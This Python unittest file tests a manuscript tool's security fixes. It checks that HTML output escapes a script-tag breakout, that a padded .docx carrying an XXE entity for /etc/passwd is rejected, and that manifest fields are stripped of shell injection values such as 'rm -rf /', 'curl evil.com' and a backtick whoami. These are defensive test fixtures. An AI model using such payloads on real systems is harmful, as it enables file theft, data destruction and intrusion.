import tempfile
import unittest
import zipfile
from pathlib import Path
import sys

REPO_ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(REPO_ROOT / "scripts"))

from lib.docx_sync import convert_docx_to_markdown
from lib.importer import extract_docx_text
from lib.zen_studio import build_zen_studio_bundle
from lib.manuscript_scaffold import read_manifest_structure


class TestSecurityRemediations(unittest.TestCase):

    def setUp(self):
        self.temp_dir = tempfile.TemporaryDirectory()
        self.root = Path(self.temp_dir.name)

    def tearDown(self):
        self.temp_dir.cleanup()

    def test_sec02_zen_studio_json_script_breakout_defense(self):
        """Validates that JSON inline script tags cannot break out with </script>."""
        notes_dir = self.root / "Manuscript"
        notes_dir.mkdir()
        (notes_dir / "bad.md").write_text(
            '---\ntitle: "Bad </script><script>alert(1)</script>"\n---\n</script><script>alert(2)</script>',
            encoding="utf-8"
        )
        html_out = self.root / "zen.html"
        build_zen_studio_bundle(
            ms_path=notes_dir,
            world_path=self.root,
            output_path=html_out,
        )
        self.assertTrue(html_out.is_file())
        content = html_out.read_text(encoding="utf-8")
        # Ensure raw unescaped </script> inside JSON blocks was sanitized to <\/script>
        self.assertNotIn("window.__INITIAL_DATA__ = {</script>", content)
        # Content Security Policy must be present
        self.assertIn("Content-Security-Policy", content)
        self.assertIn("default-src 'none'", content)

    def test_sec03_docx_and_importer_xxe_buffer_full_scan(self):
        """Validates that XML buffers larger than 4KB with <!ENTITY at the end are flagged."""
        padding = "<!-- " + ("A" * 5000) + " -->\n"
        xxe_xml = padding + '<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body><w:p><w:r><w:t>&xxe;</w:t></w:r></w:p></w:body></w:document>'

        # Create docx zip with malicious document.xml
        evil_docx = self.root / "malicious.docx"
        with zipfile.ZipFile(evil_docx, "w") as zf:
            zf.writestr("word/document.xml", xxe_xml.encode("utf-8"))

        with self.assertRaises(ValueError) as cm_docx:
            convert_docx_to_markdown(evil_docx)
        self.assertIn("Unsafe XML entity", str(cm_docx.exception))

        with self.assertRaises(ValueError) as cm_importer:
            extract_docx_text(evil_docx)
        self.assertIn("Unsafe DOCTYPE/ENTITY", str(cm_importer.exception))

    def test_sec01_manuscript_scaffold_token_sanitization(self):
        """Validates that manuscript.yaml structure keys cannot contain shell injection payloads."""
        ms_dir = self.root / "Manuscript"
        ms_dir.mkdir()
        yaml_content = """title: "Malicious Book"
structure: "three_act; rm -rf /; echo evil"
custom_divisions:
  - "Act 1 && curl evil.com"
  - "Act 2 `whoami`"
"""
        (ms_dir / "manuscript.yaml").write_text(yaml_content, encoding="utf-8")
        structure_key, custom_divs = read_manifest_structure(ms_dir)

        # Structure key must be strictly alphanumeric/dash/underscore
        self.assertEqual(structure_key, "three_actrm-rfechoevil")
        self.assertNotIn(";", structure_key)
        self.assertNotIn(" ", structure_key)

        # Custom divisions must strip dangerous shell characters
        self.assertIsNotNone(custom_divs)
        for div in custom_divs:
            self.assertNotIn("&&", div)
            self.assertNotIn("`", div)
            self.assertNotIn(";", div)


if __name__ == "__main__":
    unittest.main()
